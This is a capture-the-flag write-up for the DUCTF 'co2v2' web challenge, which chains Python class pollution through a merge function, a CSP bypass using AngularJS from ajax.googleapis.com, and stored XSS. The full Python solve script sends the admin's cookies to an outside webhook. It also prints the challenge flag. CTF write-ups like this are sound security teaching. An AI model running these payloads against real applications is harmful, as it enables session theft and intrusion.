---
created: 2024-07-06T16:35
updated: 2024-07-07T21:48
title: co2v2
solves: 59
points: 222
description: '"Payload primed, initiate deployment."'
---

## Analysis

### `/admin/update-accepted-templates`
This route changes the environment, if we can change the value of `TEMPLATES_ESCAPE_ALL` to `False`, we will disable XSS protection.

### `/save_feedback`
This route uses a fancy merge function that after verification, is indeed vulnerable to "prototype" pollution.

### `script-src 'self' 'nonce-{nonce}' https://ajax.googleapis.com;`
The CSP rule can be bypassed by using libraries from `https://ajax.googleapis.com`, such as the infamous angular xss method.

## "Prototype" Pollution

We are essentially changing values on global by hijacking the merge command to do our bidding.

```json
{
    "__class__": {
        "__init__": {
            "__globals__": {
                "TEMPLATES_ESCAPE_ALL": false,
                "os":{"environ":{"APP_URL":"hijacked"}}
            }
        }
    }
}
```

## Attack Flow

1. Sign up & sign in
2. `/create_post` XSS payload note (angular + prototype)
3. `/save_feedback` with pollution payload to change value of `TEMPLATES_ESCAPE_ALL` to false.
4. `/admin/update-accepted-templates` Ask server to update policy (it will use the new value of `TEMPLATES_ESCAPE_ALL=False`)
5. `/api/v1/report` (no modification to default environ needed)
6. Check webhook

## Solve Script

```python
import requests
import random
import string

webhook = "https://webhook.site"
target = "https://web-co2v2-f4243a8e077ecefb.2024.ductf.dev"
session = requests.Session()


def generate_random_string(length):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for _ in range(length))


def regAndLogin():

    username = generate_random_string(6)
    password = generate_random_string(6)

    data = session.post(f'{target}/register', data={
        "username": username,
        "password": password
    })
    if data.status_code != 200:
        print("failed to register", data.status_code)
        exit(1)
    data = session.post(f'{target}/login', data={
        "username": username,
        "password": password
    })
    if data.status_code != 200:
        print("failed to login", data.status_code)
        exit(1)
    print("logged in")


def createPost():
    data = session.post(f'{target}/create_post', data={
        "title": f"""
<script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js></script>
<script src=https://ajax.googleapis.com/ajax/libs/prototype/1.7.2.0/prototype.js></script>
<body class="ng-app" ng-csp>
{{{{$on.curry.call().fetch("{webhook}?"+$on.curry.call().document.cookie.toString(),{{mode:"no-cors"}})}}}}
</body>
        """,
        "content": """script loader""",
        "public": 1
    })
    if data.status_code != 200:
        print("failed to create post", data.status_code, data.text)
        exit(1)
    print("payload created")


def polluteRemote():
    data = session.post(f'{target}/save_feedback', json={
        "__class__": {
            "__init__": {
                "__globals__": {
                    "TEMPLATES_ESCAPE_ALL": False,
                    # "os": {"environ": {"APP_URL": url}} # yes i can change environ
                }
            }
        }
    })
    print("pollution complete", data.text)


def disableProtection():
    data = session.post(f'{target}/admin/update-accepted-templates', json={
        'policy': 'strict'
    })
    print("protection disabled", data.text)


def activatePayload():
    data = session.get(f'{target}/api/v1/report')
    print("payload activated", data.text)


regAndLogin()
createPost()
polluteRemote()  # "http://co2v2:1337")
disableProtection()
activatePayload()

# logged in
# payload created
# pollution complete {"success":"true"}
# protection disabled {"success":"true"}
# payload activated {"status":202}
```

```
DUCTF{_1_d3cid3_wh4ts_esc4p3d_}
```
